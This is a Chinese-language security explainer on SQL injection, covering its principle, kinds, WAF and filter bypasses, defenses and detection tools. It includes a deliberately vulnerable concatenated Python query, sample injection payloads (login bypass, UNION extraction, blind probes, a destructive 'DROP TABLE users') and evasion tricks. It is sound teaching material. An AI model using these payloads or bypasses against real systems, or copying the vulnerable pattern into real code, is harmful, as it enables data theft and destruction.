# SQL 注入 (SQL Injection)

## 概述

SQL 注入（SQLi）是一种常见且危害严重的 Web 安全漏洞。攻击者通过在应用程序输入中插入恶意 SQL 代码片段，使后端数据库执行非预期操作，从而实现数据泄露、篡改甚至服务器控制。

## 漏洞原理

当应用程序直接将用户输入拼接进 SQL 语句而未做任何过滤或参数化处理时，即存在 SQL 注入风险。

### 易受攻击代码示例

```python
# 危险：直接拼接用户输入
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

攻击者输入：
- 用户名：`admin' --`
- 密码：任意值

实际执行：
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '任意值'
```

## 分类

### 1. 联合查询注入 (Union-based)

利用 `UNION SELECT` 将攻击者构造的数据合并到查询结果中。

```
' UNION SELECT username, password FROM admin_users --
```

### 2. 报错注入 (Error-based)

利用数据库报错信息泄露敏感数据。

```
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
```

### 3. 盲注 (Blind SQLi)

#### 布尔盲注

通过页面是否正常判断条件真假：

```
' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' --
```

#### 时间盲注

通过响应延迟判断条件真假：

```
' AND IF(SUBSTRING(database(), 1, 1) = 's', SLEEP(5), 0) --
```

### 4. 堆叠查询 (Stacked Queries)

某些数据库/驱动允许用 `;` 分隔多条语句：

```
'; DROP TABLE users; --
```

## 绕过技术

### WAF 绕过

- **大小写混写**：`SeLeCt`、`UnIoN`
- **注释替换空格**：`/**/SELECT/**/`
- **编码绕过**：URL 二次编码、Unicode 编码
- **等价函数替换**：`substring()` ↔ `mid()` ↔ `substr()`

### 过滤绕过

- 空格被过滤：用 `/**/` 或 `+` 或 `%0a`
- `and`/`or` 被过滤：用 `&&`/`||`
- 引号被过滤：用十六进制 `0x61646d696e` 代替字符串

## 防御方案

### 1. 参数化查询（首选）

```python
# Python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

```java
// Java PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

### 2. ORM 框架

使用 SQLAlchemy、Django ORM 等框架自动处理参数化。

```python
# SQLAlchemy
session.query(User).filter(User.username == username).first()
```

### 3. 输入验证

白名单验证（如只允许数字 ID）：

```python
if not user_id.isdigit():
    raise ValueError("Invalid user ID")
```

### 4. 最小权限原则

数据库账户只授予应用程序所需的最小权限，禁用 `FILE`、`SUPER` 等高危权限。

## 检测工具

| 工具 | 类型 | 适用场景 |
|------|------|---------|
| sqlmap | 自动化注入工具 | 黑盒测试 |
| Burp Suite | 手动+半自动 | 复杂逻辑注入 |
| nuclei | 模板扫描 | 批量检测已知注入点 |

## 参考

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: SQL Injection
- HackTricks SQL Injection: https://book.hacktricks.xyz/pentesting-web/sql-injection
